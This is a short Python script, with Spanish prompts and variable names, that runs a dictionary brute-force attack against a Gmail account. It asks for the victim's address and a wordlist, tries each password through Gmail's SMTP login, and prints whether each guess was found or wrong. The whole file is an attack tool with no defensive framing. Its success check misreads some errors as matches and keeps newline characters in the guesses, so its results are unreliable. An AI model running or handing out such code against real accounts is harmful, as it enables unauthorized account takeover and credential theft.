import smtplib
import os
from colorama import Fore



    
def brute():
    victima =  input("Correo Gmail: ")
    password = input("Diccionario: ")
    victima = victima
    password = password

    smtp = smtplib.SMTP_SSL("smtp.gmail.com", 465)
    smtp.ehlo()

    abrir = open(password, "r")
    leer_lineas = abrir.readlines()
    a = 0
    for passwords in leer_lineas:
        a =  a + 1
        print()
        try:         
            smtp.login(victima, passwords)
            print(Fore.RESET + str(a) + "/" + str(len(leer_lineas)) + Fore.GREEN + " Contraseña Encontrada ---> {0}".format(str(passwords)) + Fore.RESET)     
        except smtplib.SMTPAuthenticationError as e :
            error = str(e)
            if error[14] == '<':
                print(Fore.RESET + str(a) + "/" + str(len(leer_lineas)) + Fore.GREEN + " Contraseña Encontrada ---> {0}".format(str(passwords)) + Fore.RESET)
            else:
                print(Fore.YELLOW + str(a) + "/" + str(len(leer_lineas)) + Fore.RED + " Contraseña Incorrecta ---> {0}".format(str(passwords)) + Fore.RESET)